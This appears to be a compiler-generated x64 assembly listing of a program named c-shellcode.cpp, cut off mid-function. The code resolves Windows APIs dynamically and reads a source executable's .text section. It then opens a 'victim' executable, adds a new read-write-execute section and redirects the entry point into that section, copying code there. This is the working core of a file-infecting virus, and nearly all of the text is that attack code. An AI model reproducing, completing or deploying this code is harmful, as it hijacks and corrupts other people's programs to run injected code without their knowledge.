	cmp	QWORD PTR _MessageBoxW$[rsp], 0
	jne	SHORT $LN9@main
	mov	eax, 5
	jmp	$LN1@main
$LN9@main:
; Line 374
	lea	rdx, OFFSET ?mb_to_wc_name@@3PADA	; mb_to_wc_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _MultiByteToWideChar$[rsp], rax
; Line 378
	lea	rdx, OFFSET ?close_handle_name@@3PADA ; close_handle_name
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _CloseHandle$[rsp], rax
; Line 385
	lea	rdx, OFFSET ?strncmp_name@@3PADA	; strncmp_name
	mov	rcx, QWORD PTR hLibC$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _strncmp$[rsp], rax
; Line 388
	cmp	QWORD PTR _strncmp$[rsp], 0
	jne	SHORT $LN10@main
; Line 391
	mov	eax, -1
	jmp	$LN1@main
$LN10@main:
; Line 399
	lea	rdx, OFFSET $SG90807
	mov	rcx, QWORD PTR hLibC$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _strcpy_s$[rsp], rax
; Line 405
	cmp	QWORD PTR _strcpy_s$[rsp], 0
	jne	SHORT $LN11@main
; Line 408
	mov	eax, -1
	jmp	$LN1@main
$LN11@main:
; Line 415
	lea	rdx, OFFSET $SG90809
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _ZeroMemory$[rsp], rax
; Line 426
	lea	rdx, OFFSET $SG90810
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _SetFilePointer$[rsp], rax
; Line 435
	lea	rdx, OFFSET $SG90811
	mov	rcx, QWORD PTR k32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _SetEndOfFile$[rsp], rax
; Line 438
	cmp	QWORD PTR _SetEndOfFile$[rsp], 0
	jne	SHORT $LN12@main
; Line 440
	mov	eax, 1
	jmp	$LN1@main
$LN12@main:
; Line 446
	lea	rdx, OFFSET ?malloc_name@@3PADA	; malloc_name
	mov	rcx, QWORD PTR hLibC$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _malloc$[rsp], rax
; Line 449
	cmp	QWORD PTR _malloc$[rsp], 0
	jne	SHORT $LN13@main
; Line 450
	mov	eax, -1
	jmp	$LN1@main
$LN13@main:
; Line 454
	lea	rdx, OFFSET ?memcpy_name@@3PADA	; memcpy_name
	mov	rcx, QWORD PTR hLibC$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _memcpy$[rsp], rax
; Line 457
	cmp	QWORD PTR _memcpy$[rsp], 0
	jne	SHORT $LN14@main
; Line 458
	mov	eax, -1
	jmp	$LN1@main
$LN14@main:
; Line 462
	mov	QWORD PTR [rsp+48], 0
	mov	DWORD PTR [rsp+40], 128			; 00000080H
	mov	DWORD PTR [rsp+32], 3
	xor	r9d, r9d
	xor	r8d, r8d
	mov	edx, -2147483648			; 80000000H
	lea	rcx, OFFSET ?fileName@@3PADA	; fileName
	call	QWORD PTR _CreateFileA$[rsp]
	mov	QWORD PTR hFile$[rsp], rax
; Line 471
	cmp	QWORD PTR hFile$[rsp], -1
	jne	SHORT $LN15@main
; Line 472
	xor	r9d, r9d
	lea	r8, OFFSET $SG90816
	lea	rdx, OFFSET $SG90817
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 473
	mov	eax, 5
	jmp	$LN1@main
$LN15@main:
; Line 476
	xor	r9d, r9d
	lea	r8, OFFSET ?msg_title@@3PA_WA	; msg_title
	lea	rdx, OFFSET ?msg_content@@3PA_WA	; msg_content
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
	npad	1
; Line 478
	cmp	QWORD PTR hFile$[rsp], -1
	je	$LN16@main
; Line 479
	mov	QWORD PTR [rsp+32], 0
	lea	r9, OFFSET ?bytesRead@@3KA		; bytesRead
	mov	r8d, 63					; 0000003fH
	lea	rdx, OFFSET ?buffer@@3PADA		; buffer
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR _ReadFile$[rsp]
	mov	DWORD PTR result$1[rsp], eax
; Line 480
	cmp	DWORD PTR result$1[rsp], 0
	je	SHORT $LN18@main
	cmp	DWORD PTR ?bytesRead@@3KA, 0		; bytesRead
	jbe	SHORT $LN18@main
; Line 482
	mov	eax, DWORD PTR ?bytesRead@@3KA		; bytesRead
	lea	rcx, OFFSET ?buffer@@3PADA		; buffer
	mov	BYTE PTR [rcx+rax], 0
; Line 484
	lea	rax, QWORD PTR wideBuffer$2[rsp]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 128				; 00000080H
	rep stosb
; Line 485
	mov	DWORD PTR [rsp+40], 64			; 00000040H
	lea	rax, QWORD PTR wideBuffer$2[rsp]
	mov	QWORD PTR [rsp+32], rax
	mov	r9d, DWORD PTR ?bytesRead@@3KA		; bytesRead
	lea	r8, OFFSET ?buffer@@3PADA		; buffer
	xor	edx, edx
	xor	ecx, ecx
	call	QWORD PTR _MultiByteToWideChar$[rsp]
; Line 486
	xor	r9d, r9d
	lea	r8, OFFSET $SG90822
	lea	rdx, QWORD PTR wideBuffer$2[rsp]
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
	npad	1
; Line 487
	jmp	SHORT $LN19@main
$LN18@main:
; Line 489
	xor	r9d, r9d
	lea	r8, OFFSET $SG90823
	lea	rdx, OFFSET $SG90824
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
	npad	1
$LN19@main:
; Line 493
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 495
	xor	r9d, r9d
	lea	r8, OFFSET $SG90825
	lea	rdx, OFFSET $SG90826
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
	npad	1
; Line 496
	jmp	SHORT $LN17@main
$LN16@main:
; Line 498
	xor	r9d, r9d
	lea	r8, OFFSET $SG90827
	lea	rdx, OFFSET $SG90828
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
	npad	1
$LN17@main:
; Line 503
	mov	QWORD PTR [rsp+48], 0
	mov	DWORD PTR [rsp+40], 128			; 00000080H
	mov	DWORD PTR [rsp+32], 3
	xor	r9d, r9d
	xor	r8d, r8d
	mov	edx, -2147483648			; 80000000H
	lea	rcx, OFFSET ?fileName@@3PADA	; fileName
	call	QWORD PTR _CreateFileA$[rsp]
	mov	QWORD PTR hFile$[rsp], rax
; Line 512
	cmp	QWORD PTR hFile$[rsp], -1
	jne	SHORT $LN20@main
; Line 513
	xor	r9d, r9d
	lea	r8, OFFSET $SG90830
	lea	rdx, OFFSET $SG90831
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 514
	mov	eax, 5
	jmp	$LN1@main
$LN20@main:
; Line 517
	xor	r9d, r9d
	lea	r8, OFFSET $SG90832
	lea	rdx, OFFSET $SG90833
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 519
	xor	edx, edx
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR _GetFileSize$[rsp]
	mov	DWORD PTR fileSize$[rsp], eax
; Line 521
	xor	r9d, r9d
	lea	r8, OFFSET $SG90834
	lea	rdx, OFFSET $SG90835
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 523
	mov	QWORD PTR [rsp+40], 0
	mov	DWORD PTR [rsp+32], 0
	xor	r9d, r9d
	mov	r8d, 2
	xor	edx, edx
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR _CreateFileMappingA$[rsp]
	mov	QWORD PTR hMapping$[rsp], rax
; Line 524
	cmp	QWORD PTR hMapping$[rsp], 0
	jne	SHORT $LN21@main
; Line 525
	xor	r9d, r9d
	lea	r8, OFFSET $SG90837
	lea	rdx, OFFSET $SG90838
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 526
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 527
	mov	eax, 1
	jmp	$LN1@main
$LN21@main:
; Line 530
	xor	r9d, r9d
	lea	r8, OFFSET $SG90839
	lea	rdx, OFFSET $SG90840
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 532
	mov	QWORD PTR [rsp+32], 0
	xor	r9d, r9d
	xor	r8d, r8d
	mov	edx, 4
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR _MapViewOfFile$[rsp]
	mov	QWORD PTR exeBase$[rsp], rax
; Line 533
	cmp	QWORD PTR exeBase$[rsp], 0
	jne	SHORT $LN22@main
; Line 534
	xor	r9d, r9d
	lea	r8, OFFSET $SG90842
	lea	rdx, OFFSET $SG90843
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 535
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 536
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 537
	mov	eax, 1
	jmp	$LN1@main
$LN22@main:
; Line 540
	xor	r9d, r9d
	lea	r8, OFFSET $SG90844
	lea	rdx, OFFSET $SG90845
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 542
	mov	DWORD PTR sectionSize$[rsp], 0
; Line 543
	mov	r8, QWORD PTR _strncmp$[rsp]
	lea	rdx, QWORD PTR sectionSize$[rsp]
	mov	rcx, QWORD PTR exeBase$[rsp]
	call	?GetTextSection@@YAPEAXPEAXPEAKP6AHPEBD2_K@Z@Z ; GetTextSection
	mov	QWORD PTR textSection$[rsp], rax
; Line 544
	cmp	QWORD PTR textSection$[rsp], 0
	je	SHORT $LN23@main
; Line 545
	xor	r9d, r9d
	lea	r8, OFFSET $SG90848
	lea	rdx, OFFSET $SG90849
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
	npad	1
; Line 547
	jmp	SHORT $LN24@main
$LN23@main:
; Line 549
	xor	r9d, r9d
	lea	r8, OFFSET $SG90850
	lea	rdx, OFFSET $SG90851
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
	npad	1
$LN24@main:
; Line 552
	xor	r9d, r9d
	lea	r8, OFFSET $SG90852
	lea	rdx, OFFSET $SG90853
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 554
	mov	rcx, QWORD PTR exeBase$[rsp]
	call	QWORD PTR _UnmapViewOfFile$[rsp]
; Line 556
	xor	r9d, r9d
	lea	r8, OFFSET $SG90854
	lea	rdx, OFFSET $SG90855
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 557
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 559
	xor	r9d, r9d
	lea	r8, OFFSET $SG90856
	lea	rdx, OFFSET $SG90857
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 561
	mov	rcx, QWORD PTR hFile$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 563
	xor	r9d, r9d
	lea	r8, OFFSET $SG90858
	lea	rdx, OFFSET $SG90859
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 566
	mov	QWORD PTR [rsp+48], 0
	mov	DWORD PTR [rsp+40], 128			; 00000080H
	mov	DWORD PTR [rsp+32], 3
	xor	r9d, r9d
	xor	r8d, r8d
	mov	edx, -1073741824			; c0000000H
	lea	rcx, OFFSET ?fileName_vic@@3PADA	; fileName_vic
	call	QWORD PTR _CreateFileA$[rsp]
	mov	QWORD PTR hFile_vic$[rsp], rax
; Line 575
	cmp	QWORD PTR hFile_vic$[rsp], -1
	jne	SHORT $LN25@main
; Line 576
	xor	r9d, r9d
	lea	r8, OFFSET $SG90861
	lea	rdx, OFFSET $SG90862
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 577
	mov	eax, 5
	jmp	$LN1@main
$LN25@main:
; Line 579
	xor	r9d, r9d
	lea	r8, OFFSET $SG90863
	lea	rdx, OFFSET $SG90864
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
; Line 580
	mov	rax, QWORD PTR _SetEndOfFile$[rsp]
	mov	QWORD PTR [rsp+64], rax
	mov	rax, QWORD PTR _SetFilePointer$[rsp]
	mov	QWORD PTR [rsp+56], rax
	mov	rax, QWORD PTR _ZeroMemory$[rsp]
	mov	QWORD PTR [rsp+48], rax
	mov	rax, QWORD PTR _strcpy_s$[rsp]
	mov	QWORD PTR [rsp+40], rax
	mov	rax, QWORD PTR _MapViewOfFile$[rsp]
	mov	QWORD PTR [rsp+32], rax
	mov	r9, QWORD PTR _CreateFileMappingA$[rsp]
	mov	r8, QWORD PTR _UnmapViewOfFile$[rsp]
	mov	rdx, QWORD PTR _CloseHandle$[rsp]
	mov	rcx, QWORD PTR hFile_vic$[rsp]
	call	?AddShellSectionAndModifyEntryPoint@@YA_NPEAXP6AH0@ZP6AHPEBX@ZP6APEAX0PEAU_SECURITY_ATTRIBUTES@@KKKPEBD@ZP6APEAX0KKK_K@ZP6AHPEAD75@ZP6AX07@ZP6AK0JPEAJK@Z1@Z ; AddShellSectionAndModifyEntryPoint
	mov	BYTE PTR AddedEntryPoint$[rsp], al
; Line 584
	mov	r9, QWORD PTR _memcpy$[rsp]
	mov	r8, QWORD PTR _malloc$[rsp]
	mov	edx, DWORD PTR sectionSize$[rsp]
	mov	rcx, QWORD PTR exeBase$[rsp]
	call	?CopyTextToShell@@YA_NPEAXKP6APEAX_K@ZP6APEAX0PEBX1@Z@Z ; CopyTextToShell
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN26@main
; Line 585
	xor	r9d, r9d
	lea	r8, OFFSET $SG90867
	lea	rdx, OFFSET $SG90868
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
	npad	1
; Line 586
	jmp	SHORT $LN27@main
$LN26@main:
; Line 588
	xor	r9d, r9d
	lea	r8, OFFSET $SG90869
	lea	rdx, OFFSET $SG90870
	xor	ecx, ecx
	call	QWORD PTR _MessageBoxW$[rsp]
	npad	1
$LN27@main:
; Line 591
	mov	rcx, QWORD PTR exeBase$[rsp]
	call	QWORD PTR _UnmapViewOfFile$[rsp]
; Line 592
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 593
	mov	rcx, QWORD PTR hFile_vic$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 595
	xor	eax, eax
$LN1@main:
; Line 596
	add	rsp, 464				; 000001d0H
	pop	rdi
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
i$1 = 32
ntHeaders$ = 40
sectionHeaders$ = 48
dosHeader$ = 56
exeBase$ = 80
sectionSize$ = 88
strncmp_func$ = 96
?GetTextSection@@YAPEAXPEAXPEAKP6AHPEBD2_K@Z@Z PROC	; GetTextSection
; File C:\Users\6lady\source\shel0101\shell3124\c-shellcode.cpp
; Line 220
$LN9:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H
; Line 225
	mov	rax, QWORD PTR exeBase$[rsp]
	mov	QWORD PTR dosHeader$[rsp], rax
; Line 226
	mov	rax, QWORD PTR dosHeader$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN5@GetTextSec
; Line 227
	xor	eax, eax
	jmp	$LN1@GetTextSec
$LN5@GetTextSec:
; Line 231
	mov	rax, QWORD PTR dosHeader$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR exeBase$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR ntHeaders$[rsp], rax
; Line 232
	mov	rax, QWORD PTR ntHeaders$[rsp]
	cmp	DWORD PTR [rax], 17744			; 00004550H
	je	SHORT $LN6@GetTextSec
; Line 233
	xor	eax, eax
	jmp	$LN1@GetTextSec
$LN6@GetTextSec:
; Line 237
	mov	rax, QWORD PTR ntHeaders$[rsp]
	movzx	eax, WORD PTR [rax+20]
	mov	rcx, QWORD PTR ntHeaders$[rsp]
	lea	rax, QWORD PTR [rcx+rax+24]
	mov	QWORD PTR sectionHeaders$[rsp], rax
; Line 240
	mov	DWORD PTR i$1[rsp], 0
	jmp	SHORT $LN4@GetTextSec
$LN2@GetTextSec:
	mov	eax, DWORD PTR i$1[rsp]
	inc	eax
	mov	DWORD PTR i$1[rsp], eax
$LN4@GetTextSec:
	mov	rax, QWORD PTR ntHeaders$[rsp]
	movzx	eax, WORD PTR [rax+6]
	cmp	DWORD PTR i$1[rsp], eax
	jge	SHORT $LN3@GetTextSec
; Line 241
	movsxd	rax, DWORD PTR i$1[rsp]
	imul	rax, rax, 40				; 00000028H
	mov	rcx, QWORD PTR sectionHeaders$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8d, 5
	lea	rdx, OFFSET $SG90604
	mov	rcx, rax
	call	QWORD PTR strncmp_func$[rsp]
	test	eax, eax
	jne	SHORT $LN7@GetTextSec
; Line 242
	movsxd	rax, DWORD PTR i$1[rsp]
	imul	rax, rax, 40				; 00000028H
	mov	rcx, QWORD PTR sectionSize$[rsp]
	mov	rdx, QWORD PTR sectionHeaders$[rsp]
	mov	eax, DWORD PTR [rdx+rax+8]
	mov	DWORD PTR [rcx], eax
; Line 243
	movsxd	rax, DWORD PTR i$1[rsp]
	imul	rax, rax, 40				; 00000028H
	mov	rcx, QWORD PTR sectionHeaders$[rsp]
	mov	eax, DWORD PTR [rcx+rax+12]
	mov	rcx, QWORD PTR exeBase$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@GetTextSec
$LN7@GetTextSec:
; Line 245
	jmp	SHORT $LN2@GetTextSec
$LN3@GetTextSec:
; Line 247
	xor	eax, eax
$LN1@GetTextSec:
; Line 248
	add	rsp, 72					; 00000048H
	ret	0
?GetTextSection@@YAPEAXPEAXPEAKP6AHPEBD2_K@Z@Z ENDP	; GetTextSection
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
size$ = 8
align$ = 16
?ALIGN_UP@@YAKKK@Z PROC					; ALIGN_UP
; File C:\Users\6lady\source\shel0101\shell3124\c-shellcode.cpp
; Line 215
	mov	DWORD PTR [rsp+16], edx
	mov	DWORD PTR [rsp+8], ecx
; Line 216
	mov	eax, DWORD PTR size$[rsp]
	mov	ecx, DWORD PTR align$[rsp]
	lea	eax, DWORD PTR [rax+rcx-1]
	mov	ecx, DWORD PTR align$[rsp]
	dec	ecx
	not	ecx
	and	eax, ecx
; Line 217
	ret	0
?ALIGN_UP@@YAKKK@Z ENDP					; ALIGN_UP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
numberOfSections$ = 48
ntHeaders$ = 56
newSection$ = 64
pBase$ = 72
hMapping$ = 80
sectionHeaders$ = 88
dosHeader$ = 96
hFile_vic$ = 128
_CloseHandle$ = 136
_UnmapViewOfFile$ = 144
_CreateFileMapping$ = 152
_MapViewOfFile$ = 160
_strcpy_s$ = 168
_ZeroMemory$ = 176
_SetFilePointer$ = 184
_SetEndOfFile$ = 192
?AddShellSectionAndModifyEntryPoint@@YA_NPEAXP6AH0@ZP6AHPEBX@ZP6APEAX0PEAU_SECURITY_ATTRIBUTES@@KKKPEBD@ZP6APEAX0KKK_K@ZP6AHPEAD75@ZP6AX07@ZP6AK0JPEAJK@Z1@Z PROC ; AddShellSectionAndModifyEntryPoint
; File C:\Users\6lady\source\shel0101\shell3124\c-shellcode.cpp
; Line 141
$LN7:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
; Line 145
	mov	QWORD PTR [rsp+40], 0
	mov	DWORD PTR [rsp+32], 0
	xor	r9d, r9d
	mov	r8d, 4
	xor	edx, edx
	mov	rcx, QWORD PTR hFile_vic$[rsp]
	call	QWORD PTR _CreateFileMapping$[rsp]
	mov	QWORD PTR hMapping$[rsp], rax
; Line 146
	cmp	QWORD PTR hMapping$[rsp], 0
	jne	SHORT $LN2@AddShellSe
; Line 148
	mov	rcx, QWORD PTR hFile_vic$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 149
	xor	al, al
	jmp	$LN1@AddShellSe
$LN2@AddShellSe:
; Line 152
	mov	QWORD PTR [rsp+32], 0
	xor	r9d, r9d
	xor	r8d, r8d
	mov	edx, 2
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR _MapViewOfFile$[rsp]
	mov	QWORD PTR pBase$[rsp], rax
; Line 153
	cmp	QWORD PTR pBase$[rsp], 0
	jne	SHORT $LN3@AddShellSe
; Line 155
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 156
	mov	rcx, QWORD PTR hFile_vic$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 157
	xor	al, al
	jmp	$LN1@AddShellSe
$LN3@AddShellSe:
; Line 161
	mov	rax, QWORD PTR pBase$[rsp]
	mov	QWORD PTR dosHeader$[rsp], rax
; Line 162
	mov	rax, QWORD PTR dosHeader$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN4@AddShellSe
; Line 164
	mov	rcx, QWORD PTR pBase$[rsp]
	call	QWORD PTR _UnmapViewOfFile$[rsp]
; Line 165
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 166
	mov	rcx, QWORD PTR hFile_vic$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 167
	xor	al, al
	jmp	$LN1@AddShellSe
$LN4@AddShellSe:
; Line 170
	mov	rax, QWORD PTR dosHeader$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR pBase$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR ntHeaders$[rsp], rax
; Line 171
	mov	rax, QWORD PTR ntHeaders$[rsp]
	cmp	DWORD PTR [rax], 17744			; 00004550H
	je	SHORT $LN5@AddShellSe
; Line 173
	mov	rcx, QWORD PTR pBase$[rsp]
	call	QWORD PTR _UnmapViewOfFile$[rsp]
; Line 174
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 175
	mov	rcx, QWORD PTR hFile_vic$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 176
	xor	al, al
	jmp	$LN1@AddShellSe
$LN5@AddShellSe:
; Line 179
	mov	rax, QWORD PTR ntHeaders$[rsp]
	movzx	eax, WORD PTR [rax+20]
	mov	rcx, QWORD PTR ntHeaders$[rsp]
	lea	rax, QWORD PTR [rcx+rax+24]
	mov	QWORD PTR sectionHeaders$[rsp], rax
; Line 180
	mov	rax, QWORD PTR ntHeaders$[rsp]
	movzx	eax, WORD PTR [rax+6]
	mov	DWORD PTR numberOfSections$[rsp], eax
; Line 183
	movsxd	rax, DWORD PTR numberOfSections$[rsp]
	imul	rax, rax, 40				; 00000028H
	mov	rcx, QWORD PTR sectionHeaders$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR newSection$[rsp], rax
; Line 184
	mov	edx, 40					; 00000028H
	mov	rcx, QWORD PTR newSection$[rsp]
	call	QWORD PTR _ZeroMemory$[rsp]
; Line 185
	mov	rax, QWORD PTR newSection$[rsp]
	lea	r8, OFFSET $SG90576
	mov	edx, 8
	mov	rcx, rax
	call	QWORD PTR _strcpy_s$[rsp]
; Line 187
	mov	rax, QWORD PTR newSection$[rsp]
	mov	DWORD PTR [rax+8], 4096			; 00001000H
; Line 188
	mov	eax, DWORD PTR numberOfSections$[rsp]
	dec	eax
	cdqe
	imul	rax, rax, 40				; 00000028H
	mov	ecx, DWORD PTR numberOfSections$[rsp]
	dec	ecx
	movsxd	rcx, ecx
	imul	rcx, rcx, 40				; 00000028H
	mov	rdx, QWORD PTR sectionHeaders$[rsp]
	mov	eax, DWORD PTR [rdx+rax+12]
	mov	rdx, QWORD PTR sectionHeaders$[rsp]
	add	eax, DWORD PTR [rdx+rcx+8]
	mov	rcx, QWORD PTR ntHeaders$[rsp]
	mov	ecx, DWORD PTR [rcx+56]
	lea	eax, DWORD PTR [rax+rcx-1]
	mov	rcx, QWORD PTR ntHeaders$[rsp]
	mov	ecx, DWORD PTR [rcx+56]
	dec	ecx
	not	ecx
	and	eax, ecx
	mov	rcx, QWORD PTR newSection$[rsp]
	mov	DWORD PTR [rcx+12], eax
; Line 189
	mov	rax, QWORD PTR ntHeaders$[rsp]
	mov	eax, DWORD PTR [rax+60]
	add	eax, 4095				; 00000fffH
	mov	rcx, QWORD PTR ntHeaders$[rsp]
	mov	ecx, DWORD PTR [rcx+60]
	dec	ecx
	not	ecx
	and	eax, ecx
	mov	rcx, QWORD PTR newSection$[rsp]
	mov	DWORD PTR [rcx+16], eax
; Line 190
	mov	eax, DWORD PTR numberOfSections$[rsp]
	dec	eax
	cdqe
	imul	rax, rax, 40				; 00000028H
	mov	ecx, DWORD PTR numberOfSections$[rsp]
	dec	ecx
	movsxd	rcx, ecx
	imul	rcx, rcx, 40				; 00000028H
	mov	rdx, QWORD PTR sectionHeaders$[rsp]
	mov	eax, DWORD PTR [rdx+rax+20]
	mov	rdx, QWORD PTR sectionHeaders$[rsp]
	add	eax, DWORD PTR [rdx+rcx+16]
	mov	rcx, QWORD PTR ntHeaders$[rsp]
	mov	ecx, DWORD PTR [rcx+60]
	lea	eax, DWORD PTR [rax+rcx-1]
	mov	rcx, QWORD PTR ntHeaders$[rsp]
	mov	ecx, DWORD PTR [rcx+60]
	dec	ecx
	not	ecx
	and	eax, ecx
	mov	rcx, QWORD PTR newSection$[rsp]
	mov	DWORD PTR [rcx+20], eax
; Line 191
	mov	rax, QWORD PTR newSection$[rsp]
	mov	DWORD PTR [rax+36], -536870880		; e0000020H
; Line 194
	mov	rax, QWORD PTR ntHeaders$[rsp]
	movzx	eax, WORD PTR [rax+6]
	inc	eax
	mov	rcx, QWORD PTR ntHeaders$[rsp]
	mov	WORD PTR [rcx+6], ax
; Line 195
	mov	rax, QWORD PTR newSection$[rsp]
	mov	eax, DWORD PTR [rax+12]
	mov	rcx, QWORD PTR newSection$[rsp]
	add	eax, DWORD PTR [rcx+8]
	mov	rcx, QWORD PTR ntHeaders$[rsp]
	mov	DWORD PTR [rcx+80], eax
; Line 198
	mov	rax, QWORD PTR ntHeaders$[rsp]
	mov	rcx, QWORD PTR newSection$[rsp]
	mov	ecx, DWORD PTR [rcx+12]
	mov	DWORD PTR [rax+40], ecx
; Line 201
	mov	rax, QWORD PTR newSection$[rsp]
	mov	eax, DWORD PTR [rax+20]
	mov	rcx, QWORD PTR newSection$[rsp]
	add	eax, DWORD PTR [rcx+16]
	xor	r9d, r9d
	xor	r8d, r8d
	mov	edx, eax
	mov	rcx, QWORD PTR hFile_vic$[rsp]
	call	QWORD PTR _SetFilePointer$[rsp]
; Line 203
	mov	rcx, QWORD PTR hFile_vic$[rsp]
	call	QWORD PTR _SetEndOfFile$[rsp]
; Line 206
	mov	rcx, QWORD PTR pBase$[rsp]
	call	QWORD PTR _UnmapViewOfFile$[rsp]
; Line 207
	mov	rcx, QWORD PTR hMapping$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 208
	mov	rcx, QWORD PTR hFile_vic$[rsp]
	call	QWORD PTR _CloseHandle$[rsp]
; Line 211
	mov	al, 1
$LN1@AddShellSe:
; Line 212
	add	rsp, 120				; 00000078H
	ret	0
?AddShellSectionAndModifyEntryPoint@@YA_NPEAXP6AH0@ZP6AHPEBX@ZP6APEAX0PEAU_SECURITY_ATTRIBUTES@@KKKPEBD@ZP6APEAX0KKK_K@ZP6AHPEAD75@ZP6AX07@ZP6AK0JPEAJK@Z1@Z ENDP ; AddShellSectionAndModifyEntryPoint
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
shellSectionSize$ = 32
shellSection$ = 40
exeBase$ = 64
textSectionSize$ = 72
_malloc$ = 80
_memcpy$ = 88
?CopyTextToShell@@YA_NPEAXKP6APEAX_K@ZP6APEAX0PEBX1@Z@Z PROC ; CopyTextToShell
; File C:\Users\6lady\source\shel0101\shell3124\c-shellcode.cpp
; Line 109
$LN4:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
; Line 110
	mov	eax, DWORD PTR textSectionSize$[rsp]
	mov	DWORD PTR shellSectionSize$[rsp], eax
; Line 113
	mov	eax, DWORD PTR shellSectionSize$[rsp]
	mov	ecx, eax
	call	QWORD PTR _malloc$[rsp]
	mov	QWORD PTR shellSection$[rsp], rax
; Line 114
	cmp	QWORD PTR shellSection$[rsp], 0
	jne	SHORT $LN2@CopyTextTo
; Line 115
	xor	al, al
	jmp	SHORT $LN1@CopyTextTo
$LN2@CopyTextTo:
; Line 119
